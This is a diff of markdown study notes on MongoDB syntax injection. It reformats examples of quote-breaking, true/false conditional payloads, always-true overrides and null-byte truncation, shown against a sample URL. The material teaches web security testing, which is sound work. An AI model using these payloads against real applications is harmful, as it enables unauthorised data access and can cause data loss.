@@ -29,21 +29,22 @@
 * Consider: `https://insecure-website.com/product/lookup?category=fizzy`
 * This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:
   * `this.category == 'fizzy'`
-* Inject: `'`
-  * `this.category == '''`
-    * If this causes a change from the original response, this may indicate that the `'` character has broken the query syntax and caused a syntax error.&#x20;
-* Confirm this by submitting a valid query string in the input, ex: `\'`:
-  * `this.category == '\''`
-    * If this doesn't cause a syntax error, this may mean that the application is vulnerable to an injection attack.
+* Inject: `'` -> `this.category == '''`
+  * If this causes a change from the original response, this may indicate that the `'` character has broken the query syntax and caused a syntax error.&#x20;
+* Confirm this by submitting a valid query string in the input, ex: `\'` -> `this.category == '\''`
+  * If this doesn't cause a syntax error, this may mean that the application is vulnerable to an injection attack.
 
 ### **Confirming conditional behavior**
 
-* false condition:&#x20;
-  * `' && 0 && 'x`
-  * `' && '1'=='2`
-* true condition:&#x20;
-  * `' && 1 && 'x`&#x20;
-  * `' && '1'=='1`
+```markdown
+# False condition
+' && 0 && 'x
+' && '1'=='2
+
+# True condition
+' && 1 && 'x 
+' && '1'=='1
+```
 
 ```
 https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
@@ -54,22 +55,35 @@ https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
 
 ### **Overriding existing conditions**
 
-* Always true:&#x20;
-  * `'||1||'`
-  * `'||'1'=='1'`
-* `https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27`
-* `this.category == 'fizzy'||1||''`
+```markdown
+# Always true: 
+'||1||'
+'||'1'=='1'
+
+# Inject: fizzy'||1||'
+https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
+
+# Back-end code
+this.category == 'fizzy'||1||''
+```
+
 * The modified query returns all items (all the products in any category).
 * WARN: If an application uses it when updating or deleting data, for example, this can result in accidental data loss.
 
-
+**Null character**
 
 * MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored.
-* `this.category == 'fizzy' && this.released == 1`
-* `https://insecure-website.com/product/lookup?category=fizzy'%00`
-* `this.category == 'fizzy'\u0000' && this.released == 1`
-* If MongoDB ignores all characters after the null character, this removes the requirement for the released field to be set to 1\
 
+```markdown
+# Back-end code
+this.category == 'fizzy' && this.released == 1
+
+# Inject null char
+https://insecure-website.com/product/lookup?category=fizzy'%00
+
+# Back-end code result [removes the req for the released field to be set to 1]
+this.category == 'fizzy'\u0000' && this.released == 1
+```
 
 ## NoSQL operator injection
 
